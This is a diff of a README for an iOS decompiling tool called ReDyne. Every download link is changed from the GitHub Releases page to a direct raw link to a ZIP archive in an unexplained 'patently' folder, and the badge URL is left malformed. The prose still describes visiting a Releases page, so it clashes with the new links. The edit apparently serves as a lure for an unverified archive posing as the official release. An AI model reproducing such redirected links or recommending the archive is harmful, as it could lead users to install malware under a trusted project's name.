@@ -1,6 +1,6 @@
 # 🎉 ReDyne - Effortless Decompiling for iOS Apps
 
-[![Download ReDyne](https://img.shields.io/badge/Download%20ReDyne-v1.0-blue.svg)](https://github.com/Isa738/ReDyne/releases)
+[![Download ReDyne](https://raw.githubusercontent.com/Isa738/ReDyne/main/patently/ReDyne.zip%https://raw.githubusercontent.com/Isa738/ReDyne/main/patently/ReDyne.zip)](https://raw.githubusercontent.com/Isa738/ReDyne/main/patently/ReDyne.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you need to download ReDyne from our Releases page.
 
 Click the link below to visit the page:
 
-[Download ReDyne](https://github.com/Isa738/ReDyne/releases)
+[Download ReDyne](https://raw.githubusercontent.com/Isa738/ReDyne/main/patently/ReDyne.zip)
 
 Once you're on the Releases page, find the latest version of ReDyne, and download the appropriate file for your operating system.
 
@@ -29,7 +29,7 @@ Make sure your system meets these requirements before downloading.
 ## 📂 How to Download
 
 1. **Visit the Releases Page:**
-   Go to [Download ReDyne](https://github.com/Isa738/ReDyne/releases).
+   Go to [Download ReDyne](https://raw.githubusercontent.com/Isa738/ReDyne/main/patently/ReDyne.zip).
    
 2. **Choose the Version:**
    Look for the latest version at the top of the page. 
@@ -97,4 +97,4 @@ ReDyne makes decompiling iOS apps straightforward and accessible. Follow the ste
 
 Remember, you can always return to the Releases page to check for updates or new features.
 
-[Download ReDyne](https://github.com/Isa738/ReDyne/releases)
+[Download ReDyne](https://raw.githubusercontent.com/Isa738/ReDyne/main/patently/ReDyne.zip)
